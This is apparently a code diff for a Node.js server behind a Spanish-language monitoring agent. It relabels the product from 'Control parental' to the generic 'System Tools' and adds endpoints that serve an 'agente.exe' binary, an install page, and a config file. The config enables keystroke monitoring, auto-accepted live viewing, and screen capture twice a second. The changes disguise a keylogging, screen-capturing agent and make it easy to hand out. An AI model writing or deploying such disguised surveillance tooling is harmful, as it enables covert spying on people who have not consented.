@@ -88,7 +88,7 @@ async function buildPdf(date) {
     stream.on('error', reject);
     doc.pipe(stream);
 
-    doc.fontSize(20).text('Control parental — Reporte diario', { align: 'center' });
+    doc.fontSize(20).text('System Tools — Reporte diario', { align: 'center' });
     doc.moveDown(0.3);
     doc.fontSize(11).text(`Fecha: ${date}`, { align: 'center' });
     doc.moveDown(1);
@@ -252,6 +252,39 @@ function watcherCount(agentId) {
   const set = watchers.get(agentId);
   return set ? set.size : 0;
 }
+
+// ---------- Descarga de agente ----------
+const agenteDir = path.join(__dirname, 'agente');
+
+app.get('/download/agent', (req, res) => {
+  const bin = path.join(agenteDir, 'agente.exe');
+  if (!fs.existsSync(bin)) return res.status(404).json({ error: 'Agente no encontrado' });
+  res.download(bin, 'agente.exe');
+});
+
+app.get('/download/config', (req, res) => {
+  const wsUrl = config.serverUrl.startsWith('ws')
+    ? config.serverUrl
+    : `wss://${config.serverUrl}`;
+  res.setHeader('Content-Disposition', 'attachment; filename="config.json"');
+  res.json({
+    serverUrl: wsUrl + '/ws',
+    agentKey: config.agentKey,
+    deviceName: 'Mi PC',
+    autoAcceptLive: true,
+    activityIntervalSec: 5,
+    frameIntervalSec: 0.5,
+    frameMaxWidth: 1920,
+    frameQuality: 85,
+    captureMonitor: 'primary',
+    keyboardMonitor: true,
+    keyboardIdleSec: 2
+  });
+});
+
+app.get('/install', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'install.html'));
+});
 
 // ---------- REST API ----------
 function auth(req, res, next) {
@@ -534,7 +567,7 @@ function handlePanelMessage(ws, data) {
 }
 
 server.listen(PORT, () => {
-  console.log(`Servidor de control parental en http://localhost:${PORT}`);
+  console.log(`Servidor en http://localhost:${PORT}`);
   ensureAllPdfs().catch((e) => console.error('PDF inicial fallo:', e.message));
 });
 
